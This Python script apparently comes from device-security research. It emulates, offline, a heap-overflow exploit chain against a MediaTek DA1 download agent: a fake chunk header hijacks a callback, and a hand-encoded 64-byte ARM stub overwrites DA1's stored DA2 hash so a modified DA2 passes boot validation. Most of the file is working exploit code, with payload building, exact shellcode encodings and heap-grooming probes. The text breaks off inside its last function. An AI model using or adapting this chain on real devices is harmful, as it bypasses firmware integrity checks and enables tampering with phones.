#!/usr/bin/env python3
"""DA1 (RMX3630 / MT6789) HeapBait -> code-exec -> hash-slot patch chain.

Offline proof, no device.  Builds on ``docs/notes/da1_emu.py`` (Unicorn harness)
and reuses the download geometry / constants of ``docs/notes/da1_heap_sweep.py``.

Chain proved here
-----------------
1. ``cmd_loop`` (0x203C08) dispatches the host-supplied ``CMD:DEBUG:DRAM-REPAIR``
   command, the handler (0x202C7C) downloads with the unclamped recv length and
   the 12-byte overflow is aimed at the live mxml node that ``mxmlDelete`` frees
   later: ``free()`` executes its fire-write ``str r1,[r0,#8]`` @0x2043CC with
   ``r0 = 0x2DF79C`` (dpc_addr) and ``r1 = D`` (the download buffer), i.e.
   ``dpc->cb = D``.
2. The handler returns, ``cmd_loop`` reaches ``ldr r4,[dpc+4]`` /
   ``blx r4`` @0x2040D4 and jumps to the stub we placed in D.
3. The stub (16 hand-encoded ARM instructions, position independent, 64 bytes)
   * copies the 32-byte digest (staged by the host in cmd_loop's 0x40-byte
     handshake buffer, addressed relative to ``sp``) into DA1's expected-digest
     slot VA 0x2688CC,
   * unlinks the forged free-list node 0x2DF79C that ``insert()`` created
     (generic prev/next unlink, the hazard of re-da1-hash-patch-audit.md 4.5),
   * zeroes the dpc fields clobbered by ``insert``/the fire (dpc+0, dpc->cb,
     dpc->arg) and returns to 0x2040D8 (safe continuation, ``bx lr``).
4. The DA stays usable: free list walkable, malloc/free works, ``cmd_loop``
   serves another command, and ``CMD:BOOT-TO`` accepts the patched DA2.

Facts re-verified by this script (not taken on trust): fire length, capacity,
``blx`` target, free-list shape after the chain, and DA1's own hash compare.

Stub placement / sizes
----------------------
* single-tap: declared download length L=0x3C on a fresh heap.  ``malloc(L+4)``
  needs ``align4(L+0x10) = 0x4C``; the 0x4C hole is consumed whole (no split), so
  user capacity = 0x40 and the 12-byte fake header lands exactly on the next
  (live, later-freed) chunk header.  Max stub = 0x40 bytes; the stub is exactly
  0x40 bytes.
* double-tap (hypothesis in the handoff): a preceding *exact-length* download
  leaves a hole that the overflowing download consumes whole, giving capacity
  ``L+4`` for any L.  This is probed empirically for L=0x100/0x400/0x1000 --
  see ``--stub-mode`` and the ``DOUBLETAP`` output line.  It does not reproduce
  (free() coalesces, so the second download splits a large block again and the
  overflow hits a free remainder); --stub-mode auto therefore uses single-tap.

Emulation model (deviation, printed at run time)
------------------------------------------------
DA1's SHA-256 entry 0x2522C4 (wrapper around init 0x252EF4 / update 0x252F64 /
final 0x253078) drives a hardware crypto block: it writes 0x1000108C (clock
gate) and 0x10210A08 and polls the engine; there is no SHA-256 K table anywhere
in the image (no software fallback).  Unicorn cannot execute that engine, so the
script installs a minimal *engine model* at 0x2522C4 that computes the digest
with hashlib and honours the routine's public contract (out buffer, *outlen=0x20,
r0=0).  Everything else on the gate -- the BOOT-TO download to 0x40000000, DA1's
own compare loop at 0x20128C..0x2012B4, the success/mismatch branches -- runs as
real DA1 code.  Use --sha-model none to see the native path fail.

Usage
-----
    python docs/notes/da1_fire_chain.py
    python docs/notes/da1_fire_chain.py --json /tmp/chain.json
    python docs/notes/da1_fire_chain.py --stub-mode single|double|auto
"""
from __future__ import annotations

import argparse
import hashlib
import json
import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))
if _HERE not in sys.path:
    sys.path.insert(0, _HERE)

from unicorn import UC_HOOK_CODE                             # noqa: E402
import unicorn.arm_const as ac                            # noqa: E402

from da1_emu import (                                    # noqa: E402
    DA1Emu, SESSION, HEAP_INIT, HEAP_HEAD, MALLOC, FREE, DPC_STRUCT,
    TRAMP_RECV, TRAMP_SEND,
)
from da1_heap_sweep import (                             # noqa: E402
    CMD_XML, XML_ADDR, PACKET_LEN_ADDR, DEFAULT_PACKET_LEN,
    DPC_ADDR, FAKE_MAGIC, CHUNK_HDR, _align4, _hexint,
)

# --- DA1 200EX01 addresses (docs/notes/uswi.handoff section 2) --------------
CMD_LOOP = 0x203C08
BLX_SITE = 0x2040D4          # blx r4
SAFE_CONT = 0x2040D8         # return address for the stub (lr at blx)
REGISTRAR = 0x200ED0         # 12 x reg_cmd(); needed before cmd_loop dispatch
RECV_REAL = 0x24FB80         # cmd_loop's I/O table -> real USB recv
SEND_REAL = 0x24FC60         # cmd_loop's I/O table -> real USB send
DST_ADDR = 0x2688CC          # expected DA2 SHA-256 slot (32 B)
SHA_ROUTINE = 0x2522C4       # DA1 sha256(data,len,out,&outlen) wrapper
BOOT_TO = 0x201080           # CMD:BOOT-TO handler (download+hash+compare)
BOOT_HASH_OK = 0x2012C0      # movw r0,#"DA hash validation OK"
BOOT_HASH_CMP = 0x2012A0     # ldrb/cmp r3,r2 in the compare loop
BOOT_HASH_BAD = 0x201338     # "DA Hash mismatch." branch
DA2_AT = 0x40000000          # BOOT-TO's hard-gated staging address
DA2_BODY = 0x56EC8           # body length this DA1 digest was computed over
MALLOC_ENTRY = MALLOC
MALLOC_RET = 0x204308        # malloc epilogue (r0 = user pointer)
FREE_CORE_WRITE = 0x2043CC   # free(): str r1,[r0,#8]  (the fire write)
DOWNLOAD_MALLOC_LR = 0x250324
# One documented, length-preserving byte change in the DA2 body.  0x543C4..
# 0x54550 is an all-zero gap (0x18C bytes) between pointer tables; no string or
# code references it, so flipping one padding byte is functionally inert and is
# done only to give the patched body a different digest.
PATCH_OFFSET = 0x54444
PATCH_XOR = 0x01

HANDSHAKE_BUF = 0x80         # cmd_loop: recv(sp+0x80, 0x40) before each command
DIGEST_OFF = 4               # "OK\0\0" prefix -> digest at buf+4 (ldmib base+4)

BOOT_XML = (
    b'<?xml version="1.0" encoding="utf-8"?><da><version>1.0</version>'
    b'<command>CMD:BOOT-TO</command><arg>'
    b'<at_address>0x40000000</at_address>'
    b'<jmp_address>0x40000000</jmp_address>'
    b'<source_file>da2</source_file></arg></da>\x00'
)
BENIGN_XML = (
    b'<?xml version="1.0" encoding="utf-8"?><da><version>1.0</version>'
    b'<command>CMD:SET-HOST-INFO</command><arg>'
    b'<target_file>t</target_file><param_file>p</param_file></arg></da>\x00'
)
SHA_OUT = 0x2BE100
SHA_OUTLEN = 0x2BE200


# ---------------------------------------------------------------------------
# tiny ARM32 (A32) encoder -- only the forms the stub needs
# ---------------------------------------------------------------------------
def _ror32(value: int, n: int) -> int:
    n &= 31
    if not n:
        return value & 0xFFFFFFFF
    return ((value >> n) | (value << (32 - n))) & 0xFFFFFFFF


def enc_rot_imm(value: int):
    """Return (imm8, rot) for an ARM modified-immediate, or None."""
    for rot in range(16):
        for imm8 in range(256):
            if _ror32(imm8, 2 * rot) == value:
                return imm8, rot
    return None


def a32_add_imm(rd: int, rn: int, value: int) -> int:
    imm = enc_rot_imm(value)
    if imm is None:
        raise ValueError(f"add #{value:#x} is not encodable")
    return 0xE2800000 | (rn << 16) | (rd << 12) | (imm[1] << 8) | imm[0]


def a32_mov_imm(rd: int, value: int) -> int:
    imm = enc_rot_imm(value)
    if imm is None:
        raise ValueError(f"mov #{value:#x} is not encodable")
    return 0xE3A00000 | (rd << 12) | (imm[1] << 8) | imm[0]


def a32_movw(rd: int, imm16: int) -> int:
    return 0xE3000000 | (((imm16 >> 12) & 0xF) << 16) | (rd << 12) | (imm16 & 0xFFF)


def a32_movt(rd: int, imm16: int) -> int:
    return 0xE3400000 | (((imm16 >> 12) & 0xF) << 16) | (rd << 12) | (imm16 & 0xFFF)


def a32_ldm_ib(rb: int, regs: int) -> int:      # ldmib rb, {regs}
    return 0xE9900000 | (rb << 16) | (regs & 0xFFFF)


def a32_stm_ia(rb: int, regs: int) -> int:      # stm rb, {regs}
    return 0xE8800000 | (rb << 16) | (regs & 0xFFFF)


def a32_ldr_imm(rd: int, rn: int, off: int) -> int:
    if not 0 <= off < 0x1000:
        raise ValueError(off)
    return 0xE5900000 | (rn << 16) | (rd << 12) | off


def a32_str_imm(rd: int, rn: int, off: int) -> int:
    if not 0 <= off < 0x1000:
        raise ValueError(off)
    return 0xE5800000 | (rn << 16) | (rd << 12) | off


A32_BX_LR = 0xE12FFF1E
REGS_R0_R7 = 0x00FF


def build_stub() -> tuple[bytes, list[str]]:
    """The 64-byte position-independent stub.

    Contract at entry (from cmd_loop's ``blx r4``):
        r4 = dpc->cb = stub address D, r0 = dpc->arg, lr = 0x2040D8,
        sp = cmd_loop frame (handshake buffer at sp+0x80).
    Contract at exit: digest written, forged node unlinked, dpc cleared, bx lr.
    Clobbers only r0-r7/r12 (r8/sb/sl/fp stay intact; r4-r7 are dead or
    reloaded by cmd_loop before their next use -- see the notes at the bottom).
    """
    words = [
        a32_add_imm(3, 13, HANDSHAKE_BUF),        # add   r3, sp, #0x80
        a32_ldm_ib(3, REGS_R0_R7),                # ldmib r3, {r0-r7}  (= buf+4)
        a32_movw(12, DST_ADDR & 0xFFFF),          # movw  r12, #0x88CC
        a32_movt(12, DST_ADDR >> 16),             # movt  r12, #0x0026
        a32_stm_ia(12, REGS_R0_R7),               # stm   r12, {r0-r7}
        a32_movw(2, DPC_ADDR & 0xFFFF),           # movw  r2, #0xF79C
        a32_movt(2, DPC_ADDR >> 16),              # movt  r2, #0x002D
        a32_ldr_imm(0, 2, 0),                     # ldr   r0, [r2]      ; prev
        a32_ldr_imm(1, 2, 4),                     # ldr   r1, [r2, #4]  ; next
        a32_str_imm(1, 0, 4),                     # str   r1, [r0, #4]  ; prev->next
        a32_str_imm(0, 1, 0),                     # str   r0, [r1]      ; next->prev
        a32_mov_imm(0, 0),                        # mov   r0, #0
        a32_str_imm(0, 2, 4),                     # str   r0, [r2, #4]  ; dpc+0
        a32_str_imm(0, 2, 8),                     # str   r0, [r2, #8]  ; dpc->cb
        a32_str_imm(0, 2, 0xC),                   # str   r0, [r2, #0xC] ; dpc->arg
        A32_BX_LR,                                # bx    lr
    ]
    # self-check against the hand-computed encodings
    expect = [0xE28D3080, 0xE99300FF, 0xE308C8CC, 0xE340C026, 0xE88C00FF,
              0xE30F279C, 0xE340202D, 0xE5920000, 0xE5921004, 0xE5801004,
              0xE5810000, 0xE3A00000, 0xE5820004, 0xE5820008, 0xE582000C,
              0xE12FFF1E]
    assert words == expect, [hex(w) for w in words]
    blob = b"".join(struct.pack("<I", w) for w in words)
    return blob, disasm(blob, 0)


def disasm(blob: bytes, base: int) -> list[str]:
    try:
        from capstone import Cs, CS_ARCH_ARM, CS_MODE_ARM
    except Exception as exc:                              # pragma: no cover
        return [f"<capstone unavailable: {exc}>"]
    md = Cs(CS_ARCH_ARM, CS_MODE_ARM)
    return [f"{i.address:08x}  {i.bytes.hex():8s}  {i.mnemonic:7s} {i.op_str}"
            for i in md.disasm(blob, base)]


# ---------------------------------------------------------------------------
# heap helpers
# ---------------------------------------------------------------------------
def u32(uc, addr: int):
    try:
        return struct.unpack("<I", uc.mem_read(addr, 4))[0]
    except Exception:
        return None


def walk_free_list(uc, limit: int = 256) -> dict:
    """Walk [head+0xC] -> node+4 -> ... until the sentinel.

    Returns nodes, whether the sentinel was reached, and whether the forged node
    (dpc_addr 0x2DF79C) or a zero link is still in the chain.
    """
    sentinel = HEAP_HEAD + 8
    nodes = []
    seen = set()
    node = u32(uc, HEAP_HEAD + 0xC)
    forged = False
    zero_link = False
    ok = False
    while len(nodes) < limit:
        if node == sentinel:
            ok = True
            break
        if node in (None, 0):
            zero_link = True
            break
        if node in seen:
            break
        seen.add(node)
        size = u32(uc, node + 8)
        nxt = u32(uc, node + 4)
        nodes.append({"addr": node, "size": size})
        if node == DPC_ADDR:
            forged = True
        node = nxt
    return {"nodes": nodes, "count": len(nodes), "sentinel_reached": ok,
            "forged_present": forged, "zero_link": zero_link}


def predict_download_buffer(uc, declared: int):
    """First-fit result of malloc(declared+4) -- same walk as malloc @0x2041E8."""
    needed = _align4(declared + 4 + CHUNK_HDR)
    sentinel = HEAP_HEAD + 8
    node = u32(uc, HEAP_HEAD + 0xC)
    for _ in range(4096):
        if node in (None, 0, sentinel):
            return None
        size = u32(uc, node + 8)
        if size is not None and size >= needed:
            return {"addr": node + CHUNK_HDR, "node": node, "node_size": size,
                    "needed": needed}
        node = u32(uc, node + 4)
    return None


# ---------------------------------------------------------------------------
# host side of the download protocol (cmd_loop handshake + HANDLER download)
# ---------------------------------------------------------------------------
class ChainHost:
    """Answers CMD:DOWNLOAD-FILE.

    overflow=True : HeapBait -- deliver ``L + 0x10`` bytes with the fake
                    3-word header at D+capacity, ``size`` = stub address D.
    overflow=False: exactly ``L`` bytes (r7 == sb exits cleanly, handler frees D).
    """

    def __init__(self, emu: DA1Emu, declared: int, overflow: bool = True,
                 packet_len: int = DEFAULT_PACKET_LEN, stub: bytes = b""):
        self.emu = emu
        self.declared = declared
        self.overflow = overflow
        self.packet_len = packet_len
        self.stub = stub
        self.capacity = _align4(declared + 0x10) - CHUNK_HDR
        self.stream_len = max(declared + 0x10, self.capacity + CHUNK_HDR)
        self.state = "idle"
        self.stream = b""
        self.pos = 0
        self.downloads = []
        self.cb_value = None          # predicted stub address (fake header size)
        self.predicted = None

    def _payload(self):
        if not self.overflow:
            return b"\x00" * self.declared
        pred = predict_download_buffer(self.emu.uc, self.declared)
        if pred is None:
            raise RuntimeError("no first-fit free node for malloc(L+4)")
        self.predicted = pred
        self.cb_value = pred["addr"]
        buf = bytearray(self.stream_len)
        buf[0:len(self.stub)] = self.stub
        off = self.capacity
        buf[off:off + CHUNK_HDR] = struct.pack("<III", FAKE_MAGIC, DPC_ADDR,
                                               self.cb_value)
        return bytes(buf)

    def _next_slice(self) -> bytes:
        remaining = len(self.stream) - self.pos
        n = min(remaining, self.packet_len)
        # never let an intermediate transfer land exactly on `declared`, or the
        # DA would take its success exit before the fake header arrives
        if self.pos + n == self.declared and remaining > n:
            n -= 1
        data = self.stream[self.pos:self.pos + n]
        self.pos += n
        return data

    def on_send(self, data: bytes):
        text = bytes(data).rstrip(b"\x00")
        if b"CMD:DOWNLOAD-FILE" in text:
            self.stream = self._payload()
            self.pos = 0
            self.state = "await_len_ok"
            self.downloads.append({"declared": self.declared,
                                   "overflow": self.overflow,
                                   "stream_len": len(self.stream),
                                   "fake_header_offset": self.capacity,
                                   "cb_value": self.cb_value})
            self.emu.rx.append(b"OK\x00")
            self.emu.rx.append(b"OK@0x%x\x00" % self.declared)
            return
        if text == b"OK" and self.state != "idle":
            if self.state == "await_len_ok":
                self.emu.rx.append(b"OK\x00")
                self.state = "await_data_ok"
            elif self.state == "await_data_ok":
                self.emu.rx.append(self._next_slice())
                self.state = "await_chunk_ok"
            elif self.state == "await_chunk_ok":
                if self.pos < len(self.stream):
                    self.emu.rx.append(b"OK\x00")
                    self.state = "await_data_ok"
                else:
                    self.state = "done"
            return
        # after the download the host ACKs the DA's result frame; cmd_loop only
        # reaches 0x20409C (the dpc->cb check) if its trailing recv succeeds
        if self.state == "done":
            self.emu.rx.append(b"OK\x00")


class BootHost:
    """Exact-length responder for BOOT-TO (fixed destination 0x40000000)."""

    def __init__(self, emu, data: bytes, packet_len: int = DEFAULT_PACKET_LEN):
        self.emu = emu
        self.data = data
        self.packet_len = packet_len
        self.state = "idle"
        self.pos = 0
        self.sent = 0

    def on_send(self, data: bytes):
        text = bytes(data).rstrip(b"\x00")
        if b"CMD:DOWNLOAD-FILE" in text:
            self.pos = 0
            self.state = "await_len_ok"
            self.emu.rx.append(b"OK\x00")
            self.emu.rx.append(b"OK@0x%x\x00" % len(self.data))
            return
        if text == b"OK" and self.state != "idle":
            if self.state == "await_len_ok":
                self.emu.rx.append(b"OK\x00")
                self.state = "await_data_ok"
            elif self.state == "await_data_ok":
                n = min(len(self.data) - self.pos, self.packet_len)
                self.emu.rx.append(self.data[self.pos:self.pos + n])
                self.pos += n
                self.sent += n
                self.state = "await_chunk_ok"
            elif self.state == "await_chunk_ok":
                if self.pos < len(self.data):
                    self.emu.rx.append(b"OK\x00")
                    self.state = "await_data_ok"
                else:
                    self.state = "done"
            return
        if self.state == "done":
            self.emu.rx.append(b"OK\x00")


# ---------------------------------------------------------------------------
# emulator setup
# ---------------------------------------------------------------------------
class _BudgetExceeded(Exception):
    pass


LOOP_BUDGET = 200_000       # hits on the hot spots below
# Pathological loops a corrupted free list can enter: the malloc first-fit walk,
# the insert walk, the download recv loop and cmd_loop itself.
BUDGET_SPOTS = (0x204248, 0x204400, 0x250380, 0x203C88, 0x2041E8, 0x204380)


def install_budget(emu, budget: int = LOOP_BUDGET) -> dict:
    """Abort emulation instead of hanging on a corrupted (post-no-fire) heap."""
    state = {"hits": 0, "hit": False}

    def tick(uc, addr, size, ud):
        state["hits"] += 1
        if state["hits"] > budget:
            state["hit"] = True
            raise _BudgetExceeded(f"loop budget {budget} exceeded at {addr:#x}")

    for addr in BUDGET_SPOTS:
        emu.uc.hook_add(UC_HOOK_CODE, tick, begin=addr, end=addr)
    return state


def boot(image: str, verbose: bool = False, map_da2: bool = False):
    """Fresh DA1 with the two extra pieces cmd_loop needs.

    * the real USB entry points 0x24FB80 / 0x24FC60 (what cmd_loop's I/O table
      0x266000/0x266004 points at) are redirected to the harness trampolines,
      so cmd_loop/handlers talk to ``emu.rx``/``emu.tx``;
    * the command registrar 0x200ED0 is executed, which the plain harness demo
      never did -- without it the 12 command names are not in 0x266070 and every
      command is "ERR!UNSUPPORTED".
    """
    emu = DA1Emu(image, verbose=verbose)
    if map_da2:
        emu.uc.mem_map(DA2_AT, 0x100000)
    emu.uc.hook_add(UC_HOOK_CODE,
                    lambda uc, a, s, u: uc.reg_write(ac.UC_ARM_REG_PC, TRAMP_RECV),
                    begin=RECV_REAL, end=RECV_REAL)
    emu.uc.hook_add(UC_HOOK_CODE,
                    lambda uc, a, s, u: uc.reg_write(ac.UC_ARM_REG_PC, TRAMP_SEND),
                    begin=SEND_REAL, end=SEND_REAL)
    emu.budget = install_budget(emu)
    emu.call(HEAP_INIT)
    emu.call(REGISTRAR)
    emu.write_bytes(PACKET_LEN_ADDR, struct.pack("<I", DEFAULT_PACKET_LEN))
    emu.budget["hits"] = 0
    return emu


def install_alloc_hooks(emu):
    """Record (request, ptr, lr) for every malloc."""
    recs = []
    gate = {}

    def entry(uc, addr, size, ud):
        gate["request"] = uc.reg_read(ac.UC_ARM_REG_R0)
        gate["lr"] = uc.reg_read(ac.UC_ARM_REG_LR)

    def ret(uc, addr, size, ud):
        if "request" in gate:
            recs.append({"request": gate.pop("request"),
                         "ptr": uc.reg_read(ac.UC_ARM_REG_R0),
                         "lr": gate.pop("lr", 0)})
            gate.clear()

    emu.uc.hook_add(UC_HOOK_CODE, entry, begin=MALLOC_ENTRY, end=MALLOC_ENTRY)
    emu.uc.hook_add(UC_HOOK_CODE, ret, begin=MALLOC_RET, end=MALLOC_RET)
    return recs


# ---------------------------------------------------------------------------
# SHA-256 engine model (hardware crypto block -> hashlib)
# ---------------------------------------------------------------------------
def install_sha_engine(emu):
    def model(uc, addr, size, ud):
        base = uc.reg_read(ac.UC_ARM_REG_R0)
        length = uc.reg_read(ac.UC_ARM_REG_R1)
        out = uc.reg_read(ac.UC_ARM_REG_R2)
        outlen_p = uc.reg_read(ac.UC_ARM_REG_R3)
        digest = hashlib.sha256(bytes(uc.mem_read(base, length))).digest()
        uc.mem_write(out, digest)
        uc.mem_write(outlen_p, struct.pack("<I", 32))
        uc.reg_write(ac.UC_ARM_REG_R0, 0)
        uc.reg_write(ac.UC_ARM_REG_PC, uc.reg_read(ac.UC_ARM_REG_LR))

    emu.uc.hook_add(UC_HOOK_CODE, model, begin=SHA_ROUTINE, end=SHA_ROUTINE)


def sha_native_probe(image: str, data: bytes) -> dict:
    """Show that 0x2522C4 cannot run without the crypto engine in Unicorn."""
    emu = DA1Emu(image, verbose=False)
    emu.uc.mem_map(0x10000000, 0x2000000)          # crypto/clock MMIO as RAM
    emu.uc.mem_map(DA2_AT, 0x100000)
    emu.call(HEAP_INIT)
    emu.uc.mem_write(DA2_AT, data)
    emu.uc.reg_write(ac.UC_ARM_REG_R0, DA2_AT)
    emu.uc.reg_write(ac.UC_ARM_REG_R1, len(data))
    emu.uc.reg_write(ac.UC_ARM_REG_R2, SHA_OUT)
    emu.uc.reg_write(ac.UC_ARM_REG_R3, SHA_OUTLEN)
    emu.uc.reg_write(ac.UC_ARM_REG_LR, 0x2B1F00)
    status = "emu_start returned"
    try:
        emu.uc.emu_start(SHA_ROUTINE, 0, count=20000)
    except Exception as exc:
        status = str(exc)
    got = bytes(emu.uc.mem_read(SHA_OUT, 0x20))
    matches = got == hashlib.sha256(data).digest()
    if matches:
        note = "software SHA-256 would be usable"
    else:
        note = ("no digest produced (routine drives the 0x1000108c clock gate "
                "and the 0x10210a08 crypto engine; the 20000-instruction budget "
                "expires inside the driver poll)")
    return {"status": status, "pc": emu.uc.reg_read(ac.UC_ARM_REG_PC),
            "budget": 20000, "matches_hashlib": matches,
            "sample": got[:8].hex(), "note": note}


# ---------------------------------------------------------------------------
# double-tap probe (handoff hypothesis)
# ---------------------------------------------------------------------------
def double_tap_probe(image: str, length: int) -> dict:
    """Two DRAM-REPAIR invocations on one emulator: exact, then overflowing."""
    emu = boot(image)
    allocs = install_alloc_hooks(emu)
    emu.write_bytes(XML_ADDR, CMD_XML)
    result = {"L": length, "capacity": _align4(length + 0x10) - CHUNK_HDR,
              "taps": [], "fire": False, "reason": ""}

    for overflow in (False, True):
        allocs.clear()
        emu.rx.clear()
        emu.uc.reg_write(ac.UC_ARM_REG_SP, 0x2CF000)
        # DPС is single-shot: clear it so tap 2 starts from a clean dpc struct
        emu.write_bytes(DPC_STRUCT, b"\x00" * 12)
        host = ChainHost(emu, length, overflow=overflow)
        emu.on_send = host.on_send
        emu.budget["hits"] = 0
        rc = emu.call(0x202C7C, [SESSION, XML_ADDR])
        dl = [a for a in allocs if a["lr"] == DOWNLOAD_MALLOC_LR and a["ptr"]]
        tap = {"overflow": overflow,
               "rc": rc & 0xFFFFFFFF if isinstance(rc, int) else rc,
               "D": dl[0]["ptr"] if dl else None,
               "predicted": host.predicted["addr"] if host.predicted else None,
               "node_size": (host.predicted["node_size"]
                             if host.predicted else None),
               "needed": (host.predicted["needed"]
                          if host.predicted else None),
               "exact_fit": bool(host.predicted
                                 and host.predicted["node_size"]
                                 == host.predicted["needed"]),
               "cb_value": host.cb_value,
               "dpc_cb": u32(emu.uc, DPC_STRUCT + 4),
               "free_list_len": walk_free_list(emu.uc)["count"]}
        if dl and host.predicted:
            nxt = host.predicted["addr"] + host.capacity
            free_addrs = {n["addr"] for n in walk_free_list(emu.uc)["nodes"]}
            ptrs = {a["ptr"] for a in allocs}
            tap["next_header"] = nxt
            tap["next_class"] = ("free-remainder" if nxt in free_addrs else
                                 "allocated" if (nxt + CHUNK_HDR) in ptrs else
                                 "unknown")
        result["taps"].append(tap)

    tap1, tap2 = result["taps"]
    if tap2["dpc_cb"] and tap2["cb_value"] and tap2["dpc_cb"] == tap2["cb_value"]:
        result["fire"] = True
        result["reason"] = "second (overflowing) tap fired with dpc->cb == D"
    elif tap2["next_class"] == "free-remainder":
        result["reason"] = (
            "no fire: the second (overflowing) tap did not consume a preserved "
            "hole whole -- "
            + ("an exact-fit node was reused but its upper neighbour is still a "
               "free node" if tap2.get("exact_fit") else
               "malloc split a larger free node, the fake header landed on the "
               "free remainder")
            + " (capacity stayed L+4, victim is not a live chunk)")
    else:
        result["reason"] = (f"no fire (next_class={tap2.get('next_class')}, "
                            f"dpc->cb={tap2['dpc_cb']:#x})"
                            if isinstance(tap2["dpc_cb"], int)
                            else "no fire")
    result["first_tap_clean"] = bool(tap1["rc"] == 0)
    result["budget_hit"] = emu.budget["hit"]
    return result


# ---------------------------------------------------------------------------
# main chain
# ---------------------------------------------------------------------------
def run_chain(image: str, da2_path: str, stub_mode: str, fire_length: int,
              sha_model: str, verbose: bool) -> dict:
    out = {"image": os.path.abspath(image), "da2": os.path.abspath(da2_path),
           "stub_mode_requested": stub_mode, "sha_model": sha_model}

    stub, stub_asm = build_stub()
    out["stub"] = {"size": len(stub), "hex": stub.hex(), "disasm": stub_asm}

    # ---- patched DA2 body + digest ---------------------------------------
    da2 = open(da2_path, "rb").read()
    if len(da2) < DA2_BODY + 0x100:
        raise SystemExit(f"DA2 image too short: {len(da2):#x}")
    body = bytearray(da2[:DA2_BODY])
    old_digest = hashlib.sha256(bytes(body)).digest()
    slot_orig = bytes(open(image, "rb").read()[DST_ADDR - 0x200000:
                                               DST_ADDR - 0x200000 + 32])
    body[PATCH_OFFSET] ^= PATCH_XOR
    digest = hashlib.sha256(bytes(body)).digest()
    out["da2_patch"] = {"offset": PATCH_OFFSET, "xor": PATCH_XOR,
                        "length": DA2_BODY,
                        "old_digest": old_digest.hex(),
                        "new_digest": digest.hex(),
                        "slot_before": slot_orig.hex(),
                        "slot_matches_old": slot_orig == old_digest,
                        "length_preserved": len(body) == DA2_BODY}

    # ---- double-tap probe -------------------------------------------------
    probes = []
    if stub_mode in ("auto", "double"):
        for length in (0x100, 0x400, 0x1000):
            probes.append(double_tap_probe(image, length))
    out["double_tap"] = probes
    double_ok = any(p["fire"] for p in probes)
    if stub_mode == "double" and not double_ok:
        out["fatal"] = "double-tap did not reproduce (see double_tap evidence)"
        return out
    if stub_mode in ("auto", "double") and double_ok:
        chosen = next(p for p in probes if p["fire"])
        fire_length = chosen["L"]
        out["stub_mode"] = "double"
    else:
        out["stub_mode"] = "single"
    out["fire_length"] = fire_length
    capacity = _align4(fire_length + 0x10) - CHUNK_HDR
    out["capacity"] = capacity

    # ---- boot + fire ------------------------------------------------------
    emu = boot(image, verbose=verbose)
    allocs = install_alloc_hooks(emu)
    events = {"blx": [], "fire_write": None, "free_list_before": None,
              "free_writes": [], "safe_cont_hits": 0}
    walk_before = walk_free_list(emu.uc)
    events["free_list_before"] = walk_before

    def on_blx(uc, addr, size, ud):
        events["blx"].append({
            "target": uc.reg_read(ac.UC_ARM_REG_R4),
            "r0": uc.reg_read(ac.UC_ARM_REG_R0),
            "r1": uc.reg_read(ac.UC_ARM_REG_R1),
            "r2": uc.reg_read(ac.UC_ARM_REG_R2),
            "r3": uc.reg_read(ac.UC_ARM_REG_R3),
            "sp": uc.reg_read(ac.UC_ARM_REG_SP),
            "lr": uc.reg_read(ac.UC_ARM_REG_LR),
        })

    def on_fire_write(uc, addr, size, ud):
        # free() core: r0 = node from [user-8], r1 = size from [user-4].
        # The HeapBait fire is the store whose node is the forged dpc_addr.
        node = uc.reg_read(ac.UC_ARM_REG_R0)
        rec = {"node": node, "value": uc.reg_read(ac.UC_ARM_REG_R1)}
        events["free_writes"].append(rec)
        if node == DPC_ADDR:
            events["fire_write"] = rec

    def on_safe_cont(uc, addr, size, ud):
        events["safe_cont_hits"] += 1

    emu.uc.hook_add(UC_HOOK_CODE, on_blx, begin=BLX_SITE, end=BLX_SITE)
    emu.uc.hook_add(UC_HOOK_CODE, on_safe_cont, begin=SAFE_CONT, end=SAFE_CONT)
    emu.uc.hook_add(UC_HOOK_CODE, on_fire_write, begin=FREE_CORE_WRITE,
                    end=FREE_CORE_WRITE)

    host = ChainHost(emu, fire_length, overflow=True, stub=stub)
    emu.on_send = host.on_send
    # double-tap replay: the probe proved an exact-length download shapes the
    # hole, so reproduce that first tap on this emulator before the overflow.
    if out["stub_mode"] == "double":
        pre = ChainHost(emu, fire_length, overflow=False)
        emu.on_send = pre.on_send
        emu.write_bytes(XML_ADDR, CMD_XML)
        pre_rc = emu.call(0x202C7C, [SESSION, XML_ADDR])
        out["double_tap_prelude_rc"] = pre_rc & 0xFFFFFFFF
        emu.rx.clear()
        emu.write_bytes(DPC_STRUCT, b"\x00" * 12)
        emu.on_send = host.on_send
    # cmd_loop's 0x40-byte handshake buffer: "OK" + NUL pad to 4 bytes, then the
    # 32-byte digest; the stub reads buf+4 with `ldmib r3,{r0-r7}` from sp+0x80.
    emu.rx.append(b"OK\x00".ljust(DIGEST_OFF, b"\x00") + digest)
    emu.rx.append(CMD_XML)

    emu.budget["hits"] = 0
    emu.budget["hit"] = False
    rc = emu.call(CMD_LOOP, [])
    rc &= 0xFFFFFFFF
    out["cmdloop_rc"] = rc
    out["budget_hit"] = emu.budget["hit"]
    out["budget_hits"] = emu.budget["hits"]
    out["events"] = events
    dl = [a for a in allocs if a["lr"] == DOWNLOAD_MALLOC_LR and a["ptr"]]
    actual_d = dl[0]["ptr"] if dl else None
    out["download_buffer"] = actual_d
    out["predicted_buffer"] = host.predicted["addr"] if host.predicted else None
    out["prediction_ok"] = (host.predicted is not None
                            and actual_d == host.predicted["addr"])

    blx = events["blx"][0] if events["blx"] else None
    out["blx"] = blx
    out["fire_cb"] = blx["target"] if blx else None
    out["fire_ok"] = bool(blx and actual_d and blx["target"] == actual_d)
    # the stub's `bx lr` must land on cmd_loop's continuation, not on garbage
    out["stub_return_ok"] = bool(blx and events["safe_cont_hits"] > 0)

    # ---- (i) free list ----------------------------------------------------
    walk_after = walk_free_list(emu.uc)
    out["free_list_after"] = walk_after
    out["assert_freelist"] = bool(walk_after["sentinel_reached"]
                                 and not walk_after["forged_present"]
                                 and not walk_after["zero_link"])

    # ---- (ii) malloc/free x3 ---------------------------------------------
    alloc_rounds = []
    for _ in range(3):
        emu.budget["hits"] = 0
        p = emu.call(MALLOC, [0x100, 0])
        p &= 0xFFFFFFFF
        frc = emu.call(FREE, [p])
        alloc_rounds.append({"ptr": p, "free_rc": frc & 0xFFFFFFFF})
    out["alloc_rounds"] = alloc_rounds
    out["assert_alloc"] = all(r["ptr"] not in (0, 0xFFFFFFFF) and r["free_rc"] == 0
                              for r in alloc_rounds)
    out["free_list_after_alloc"] = walk_free_list(emu.uc)

    # ---- (iii) one more benign command ------------------------------------
    emu.on_send = None
    emu.rx.clear()
    emu.tx.clear()
    emu.rx.append(b"OK\x00")
    emu.rx.append(BENIGN_XML)
